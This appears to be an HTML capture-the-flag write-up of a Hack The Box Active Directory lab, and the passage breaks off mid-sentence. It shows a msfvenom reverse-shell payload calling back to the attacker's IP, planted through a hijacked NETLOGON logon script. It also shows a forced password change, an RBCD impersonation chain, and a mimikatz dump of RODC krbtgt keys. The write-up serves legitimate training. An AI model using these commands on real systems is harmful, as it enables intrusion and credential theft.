@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>HTB - Season10 - Writeups - Garfield</title>
+   <link rel="stylesheet" href="/static/style.css">
+   <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+   <canvas class="matrix-bg" id="matrix"></canvas>
+
+   <header>
+      <div class="header-content">
+         <div class="terminal-prompt">k0d14k@kali:~#</div>
+         <div class="img-text">
+               <img src="/static/images/avatar.png" width="100rem">
+               <div class="text">
+                  <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                  <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+               </div>
+         </div>
+      </div>
+   </header>
+
+   <nav>
+      <ul>
+         <li><a href="/">Home</a></li>
+         <li><a href="/#about">Whoami</a></li>
+         <li><a href="/#skills">Skills</a></li>
+         <li><a href="/#projects">Projects</a></li>
+         <li><a href="/#contact">Contacts</a></li>
+      </ul>
+   </nav>
+
+   <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+      <img src="images/garfield.png" alt="500rem">   
+      <h1>Garfield - HTB Season 10</h1>
+
+      <p>
+            <b>Categories</b>: #active-directory, #netlogon-login-scripts, #ForceChangePassword, #WriteAccountRestrictions, #read-only-domain-controller, #PasswordReplicationPolicy, #k-list-attack
+      </p>
+
+      <hr>
+
+      <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+               <!--USED BY THE LISTER-->
+               <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+      </section>
+
+      <section id="asumed-breach">
+         <p>As usual with this type of machine, HackTheBox provides an initial set of credentials:</p>
+         <div class="code">
+            j.arbuckle:Th1sD4mnC4t!@1978
+         </div>
+      </section>
+
+      <section id="enumeration">
+         <h2>cat enumeration</h2>
+         
+         <h3>Nmap TCP SCan</h3>
+
+         <div class="code">
+            # Nmap 7.95 scan initiated Mon Apr&nbsp;&nbsp;6 15:00:13 2026 as: nmap -sS -v -oN enum/tcp-scan.txt 10.129.244.207 <br>
+            Nmap scan report for 10.129.244.207 <br>
+            Host is up (0.14s latency). <br>
+            Not shown: 986 filtered tcp ports (no-response) <br>
+            PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE <br>
+            53/tcp&nbsp;&nbsp; open&nbsp;&nbsp;domain <br>
+            88/tcp&nbsp;&nbsp; open&nbsp;&nbsp;kerberos-sec <br>
+            135/tcp&nbsp;&nbsp;open&nbsp;&nbsp;msrpc <br>
+            139/tcp&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn <br>
+            389/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ldap <br>
+            445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds <br>
+            464/tcp&nbsp;&nbsp;open&nbsp;&nbsp;kpasswd5 <br>
+            593/tcp&nbsp;&nbsp;open&nbsp;&nbsp;http-rpc-epmap <br>
+            636/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ldapssl <br>
+            2179/tcp open&nbsp;&nbsp;vmrdp <br>
+            3268/tcp open&nbsp;&nbsp;globalcatLDAP <br>
+            3269/tcp open&nbsp;&nbsp;globalcatLDAPssl <br>
+            3389/tcp open&nbsp;&nbsp;ms-wbt-server <br>
+            5985/tcp open&nbsp;&nbsp;wsman <br>
+            <br>
+            Read data files from: /usr/bin/../share/nmap <br>
+            # Nmap done at Mon Apr&nbsp;&nbsp;6 15:00:19 2026 -- 1 IP address (1 host up) scanned in 6.77 seconds
+         </div>
+
+         <p>The TCP port scan reveals all the ports typical of an Active Directory Domain Controller.</p>
+
+         <p>
+            By running the <span class="highlight">nxc ldap</span> command we can confirm this is the domain controller and add the IP to our 
+            <span class="highlight">/etc/hosts</span> file.
+         </p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/garfield/enum$ nxc ldap DC01.garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' <br>
+            LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.244.207&nbsp;&nbsp;389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert)&nbsp;&nbsp;<br>
+            LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.244.207&nbsp;&nbsp;389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978&nbsp;&nbsp;<br>
+            k0d14k@kpb:~/Documenti/garfield/leak$ echo "10.129.244.207 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts <br>
+            [sudo] password di k0d14k:&nbsp;&nbsp;<br>
+            10.129.244.207 garfield.htb DC01.garfield.htb
+         </div>
+         
+         <h3>Share Enumeration</h3>
+
+         <p>
+            Using the <span class="highlight">nxc smb</span> command I attempt to enumerate the shares for which I have read permissions as user <span class="highlight">j.arbuckle</span>:
+         </p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/garfield/enum$ nxc smb DC01.garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True) <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978  <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Enumerated shares <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Share&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Permissions&nbsp;&nbsp;&nbsp;&nbsp; Remark <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------&nbsp;&nbsp;&nbsp;&nbsp; ------ <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote Admin <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default share <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote IPC <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETLOGON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon server share  <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.244.207&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SYSVOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon server share 
+         </div>
+
+         <p>
+            The <span class="highlight">SYSVOL</span> and <span class="highlight">NETLOGON</span> shares have read permissions enabled. I proceed to 
+            dump their contents via the <span class="highlight">smbclient</span> command:
+         </p>
+         
+         <div class="code">
+            smbclient //DC01.garfield.htb/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'recurse ON; prompt OFF; mget *' <br>
+            NT_STATUS_ACCESS_DENIED listing \garfield.htb\DfsrPrivate\* <br>
+            getting file \garfield.htb\scripts\printerDetect.bat of size 217 as garfield.htb/scripts/printerDetect.bat (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec) <br>
+            getting file \garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as garfield.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,0 KiloBytes/sec) (average 0,2 KiloBytes/sec) <br>
+            getting file \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 23 as garfield.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,0 KiloBytes/sec) (average 0,1 KiloBytes/sec) <br>
+            getting file \garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2792 as garfield.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (4,9 KiloBytes/sec) (average 1,3 KiloBytes/sec) <br>
+            getting file \garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as garfield.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1,9 KiloBytes/sec) (average 1,4 KiloBytes/sec) <br>
+            getting file \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\Audit\audit.csv of size 535 as garfield.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/Audit/audit.csv (0,9 KiloBytes/sec) (average 1,3 KiloBytes/sec) <br>
+            getting file \garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3904 as garfield.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6,9 KiloBytes/sec) (average 2,1 KiloBytes/sec) <br>
+            smbclient //10.129.244.207/NETLOGON -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c "recurse ON; prompt OFF; mget *" <br>
+            getting file \printerDetect.bat of size 217 as printerDetect.bat (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
+         </div>
+
+         <p>From these shares I manage to retrieve the Password Policy used by domain users:</p>
+
+         <div class="code">
+            [Unicode] <br>
+            Unicode=yes <br>
+            [System Access] <br>
+            MinimumPasswordAge = 1 <br>
+            MaximumPasswordAge = 42 <br>
+            MinimumPasswordLength = 7 <br>
+            PasswordComplexity = 0 <br>
+            PasswordHistorySize = 24 <br>
+            LockoutBadCount = 0 <br>
+            RequireLogonToChangePassword = 0 <br>
+            ForceLogoffWhenHourExpire = 0 <br>
+            ClearTextPassword = 0 <br>
+            LSAAnonymousNameLookup = 0 <br>
+            [Kerberos Policy] <br>
+            MaxTicketAge = 10 <br>
+            MaxRenewAge = 7 <br>
+            MaxServiceAge = 600 <br>
+            MaxClockSkew = 5 <br>
+            TicketValidateClient = 1 <br>
+            [Version] <br>
+            signature="$CHICAGO$" <br>
+            Revision=1 <br>
+            [Registry Values] <br>
+            MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
+         </div>
+
+         <p>I also notice the presence of a batch script <span class="highlight">printerDetect.bat</span> inside the <span class="highlight">NETLOGON</span> share.</p>
+
+         <h3>Bloodhound</h3>
+
+         <p>Before proceeding I run a Bloodhound enumeration using the collector integrated in <span class="highlight">nxc</span>:</p>
+
+         <img src="./images/Pasted image 20260407115849.png" width="1000rem">
+
+         <p>Through Bloodhound I discover the existence of other users that will be needed later to establish the reverse shell.</p>
+      </section>
+
+      <section id="foothold">
+         <h2>cat foothold</h2>
+         <p>
+            After some investigation I discover that <span class="highlight">NETLOGON</span> is used to configure scripts that run automatically at user login, 
+            and that via <span class="highlight">SYSVOL</span> I can modify the script in the <span class="highlight">garfield.htb\scripts</span> folder. Based 
+            on this, I understand that user <span class="highlight">l.wilson</span> will attempt to log in and I set up the following attack:
+         </p>
+
+         <ol>
+            <li>
+               <p>I set up a listener in Metasploit:</p>
+               <div class="code">
+                  msfconsole -x 'use exploit/multi/handler; set LHOST 10.10.15.219; set LPORT 9999; set payload windows/x64/meterpreter/reverse_tcp; run'
+               </div>
+            </li>
+            <li>
+               <p>I create a malware with msfvenom that upgrades the shell to a meterpreter shell (more convenient for the upload and download phases):</p>
+               <div class="code">
+                  k0d14k@kpb:~/Documenti/garfield/foothold$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.219 LPORT=9999 -o reverse.exe -f exe <br>
+                  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload <br>
+                  [-] No arch selected, selecting arch: x64 from the payload <br>
+                  No encoder specified, outputting raw payload <br>
+                  Payload size: 510 bytes <br>
+                  Final size of exe file: 7680 bytes <br>
+                  Saved as: reverse.exe <br>
+                  k0d14k@kpb:~/Documenti/garfield/foothold$ smbclient //DC01.garfield.htb/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -D garfield.htb/scripts -c 'put reverse.exe' <br>
+                  putting file reverse.exe as \garfield.htb\scripts\reverse.exe (58,1 kb/s) (average 58,1 kb/s)
+               </div>
+            </li>
+            <li>
+               <p>I write a <span class="highlight">printerDetect.bat</span> that executes the malware uploaded to <span class="highlight">scripts</span>:</p>
+               <div class="code">start "" "C:\Windows\SYSVOL\sysvol\garfield.htb\scripts\reverse.exe"</div>
+               <div class="code">
+                  k0d14k@kpb:~/Documenti/garfield/foothold$ smbclient //DC01.garfield.htb/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -D garfield.htb/scripts -c 'put printerDetect.bat'
+                  putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (0,8 kb/s) (average 0,8 kb/s)
+               </div>
+            </li>
+            <li>
+               <p>
+                  I then set the <span class="highlight">scriptPath</span> attribute of the target user using an <span class="highlight">LDAP Data Interchange Format</span> 
+                  script:
+               </p>
+               <div class="code">
+                  dn: CN=LIZ WILSON,CN=USERS,DC=GARFIELD,DC=HTB <br>
+                  changetype: modify <br>
+                  replace: scriptPath <br>
+                  scriptPath: printerDetect.bat
+               </div>
+               <div class="code">
+                  k0d14k@kpb:~/Documenti/garfield/foothold$ ldapmodify -f foothold.ldif -H ldap://DC01.garfield.htb -x -w 'Th1sD4mnC4t!@1978' -D j.arbuckle@garfield.htb
+                  modifying entry "CN=LIZ WILSON,CN=USERS,DC=GARFIELD,DC=HTB"
+               </div>
+            </li>
+         </ol>
+         
+         <p>
+            After this command the user will attempt to log in and our shell will be established. Once this connection is obtained, 
+            I run the <span class="highlight">SharpHound.exe</span> tool from within the machine to update the enumeration and find that a lateral movement path 
+            exists between <span class="highlight">l.wilson</span> and <span class="highlight">l.wilson_adm</span>:
+         </p>
+            
+         <img src="./images/Pasted image 20260407120042.png" width="1000rem">
+
+         <p>
+            Bloodhound itself suggests the commands to force a password change. I therefore download the <span class="highlight">PowerView.ps1</span> module to the 
+            target machine and run the following commands:
+         </p>
+         
+         <div class="code">
+            . .\PowerView.ps1 <br>
+            Set-DomainUserPassword -Identity 'l.wilson_adm' -AccountPassword $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
+         </div>
+
+         <p>
+            After execution we will have successfully changed the password for <span class="highlight">l.wilson_adm</span> and gained RDP access to read the user flag:
+         </p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/garfield/foothold$ nxc ldap DC01.garfield.htb -u l.wilson_adm -p 'Password123!' <br>
+            LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.21.211&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert)&nbsp;&nbsp;<br>
+            LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.21.211&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] garfield.htb\l.wilson_adm:Password123! 
+         </div>
+
+         <img src="./images/Pasted image 20260407120431.png" width="1000rem">
+
+      </section>
+
+      <section id="rodc-escalation">
+         <h2>cat rodc-escalation</h2>
+
+         <p>Now that we have a second account I continue enumerating the domain controller.</p>
+
+         <p>I discover the existence of another subnet that I clearly cannot reach from my attacker machine:</p>
+
+         <img src="./images/Pasted image 20260424000622.png" width="1000rem">
+
+         <p>I therefore decide to forward this subnet using the <span class="highlight">ligolo</span> agent.</p>
+
+         <p>
+            Within this subnet I can only reach two machines, but I don't yet know who they are. I run a Cypher query in Bloodhound to check for other 
+            computers in the infrastructure and come across <span class="highlight">RODC01.garfield.htb</span>:
+         </p>
+
+         <img src="./images/Pasted image 20260424001330.png" width="1000rem">
+
+         <p>
+            I add this Domain Controller to the <span class="highlight">/etc/hosts</span> file as well. It has the distinctive characteristic of being a 
+            <span class="highlight">Read Only Domain Controller</span>. I discover that this type of Domain Controller can cache user credentials in memory so 
+            that users can still connect even in case of connectivity issues or loss of communication with the central Domain Controller.
+         </p>
+
+         <p>Bloodhound also provides another major hint:</p>
+
+         <img src="./images/Pasted image 20260424004346.png" width="1000rem">
+
+         <p>
+            We have privileges on the RODC, specifically <span class="highlught">WriteAccountRestrictions</span>, which allows us to escalate our privileges and 
+            become local Administrator of the controller.
+         </p>
+         
+         <p>I run the following commands:</p>
+         
+         <div class="code">
+            addcomputer.py -computer-name 'k0d14k$' -computer-pass 'Password123!' -dc-host DC01.garfield.htb 'garfield.htb/l.wilson_adm:Password123!' <br> 
+            <br> 
+            rbcd.py -delegate-from 'k0d14k$' -delegate-to 'RODC01$' -action 'write' 'garfield.htb/l.wilson_adm:Password123!' <br> 
+            <br> 
+            getTGT.py 'garfield.htb/k0d14k$:Password123!' -dc-ip DC01.garfield.htb <br> 
+            <br> 
+            export KRB5CCNAME=k0d14k\$.ccache <br> 
+            <br> 
+            getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate 'Administrator' 'garfield.htb/k0d14k$:Password123!'
+         </div>
+
+         <p>I then confirm execution via <span class="highlight">nxc wmi</span>:</p>
+         
+         <div class="code">
+            k0d14k@kpb:~$ nxc wmi RODC01.garfield.htb -u Administrator -k --use-kcache -X 'whoami' <br> 
+            RPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:RODC01) (domain:garfield.htb) <br> 
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] garfield.htb\Administrator from ccache (Pwn3d!) <br> 
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] Executed PowerShell command: "whoami" via wmiexec <br> 
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; garfield\administrator
+         </div>
+
+         <p>
+            Now that we have code execution we can use the same technique as before to open a reverse shell. I copy the <span class="highlight">reverse.exe</span> file 
+            into the <span class="highlight">C:\Windows\Temp</span> folder on RODC01 using an unprivileged session as <span class="highlight">l.wilson_adm</span> and then 
+            execute the malware using <span class="highlight">nxc wmi</span>:
+         </p>
+         
+         <div class="code">
+            $sess = New-PSSession -ComputerName RODC01 <br>
+            Copy-Item -Path .\reverse.exe -destination C:\Windows\Temp -ToSession $sess
+         </div>
+         
+         <div class="code">
+            k0d14k@kpb:~$ nxc wmi RODC01.garfield.htb -u Administrator -k --use-kcache -x 'start "" "C:\Windows\Temp\reverse.exe"' <br>
+            RPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:RODC01) (domain:garfield.htb) <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] garfield.htb\Administrator from ccache (Pwn3d!) <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [-] WMIEXEC: Could not retrieve output file! Either command timed out or AV killed the process. Please try increasing the timeout: '--exec-timeout 10' <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RODC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;RODC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] Executed command: "start "" "C:\Windows\Temp\reverse.exe"" via wmiexec <br>
+         </div>
+
+         <p>
+            We have our <span class="highlight">meterpreter</span> shell as <span class="highlight">Administrator</span> inside <span class="highlight">RODC01</span>.
+         </p>
+
+         <p>
+            Every Read Only Domain Controller uses a <span class="highlight">KRGTGT_XXXX</span> user to encrypt TGT tickets. This means that somewhere in RODC01's 
+            memory there is a key used by this user for Kerberos ticket encryption.
+         </p>
+
+         <p>
+            To extract this key I attempt to dump the <span class="highlight">lsass</span> process with <span class="highlight">mimikatz</span>:
+         </p>
+         
+         <div class="code">
+            .\mimikatz.exe "lsadump::lsa /inject" "exit" <br>
+            [...] <br>
+            RID&nbsp;&nbsp;: 00000643 (1603) <br>
+            User : krbtgt_8245 <br>
+            <br>
+            * Primary <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;NTLM : 445aa4221e751da37a10241d962780e2 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;LM&nbsp;&nbsp; :&nbsp;&nbsp;<br>
+            &nbsp;&nbsp;Hash NTLM: 445aa4221e751da37a10241d962780e2 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;ntlm- 0: 445aa4221e751da37a10241d962780e2 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;lm&nbsp;&nbsp;- 0: 0ab3d34a182bb016fc4cfd26544a9f16 <br>
+            <br>
+            * WDigest <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;[...] <br>
+            <br>
+            * Kerberos <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Default Salt : GARFIELD.HTBkrbtgt_8245 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Credentials <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;des_cbc_md5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : d540fe6192b9ecfe <br>
+            <br>
+            * Kerberos-Newer-Keys <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Default Salt : GARFIELD.HTBkrbtgt_8245 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Default Iterations : 4096 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Credentials <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aes256_hmac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aes128_hmac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (4096) : 124c0fd09f5fa4efca8d9f1da91369e5 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;des_cbc_md5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (4096) : d540fe6192b9ecfe <br>
+            <br>
+            * NTLM-Strong-NTOWF <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;Random Value : f4b51c2c0d006172304e31dbc6e0de6b <br>
+            <br>
+            [...]
+         </div>
+
+         <p>
+            We have successfully retrieved the <span class="highlight">AES</span> key of the <span class="highlight">KRBTGT_8245</span> user. Before we can actually 
+            use this information for privilege escalation on the main Domain Controller, we need to modify the permission configuration of 
+            <span class="highlight">l.wilson_adm</span>.
+         </p>
+
+         <p>
+            The key allows us to issue TGT tokens as if we were the DC, using credentials cached inside RODC01. However, there are situations where, for security reasons, 
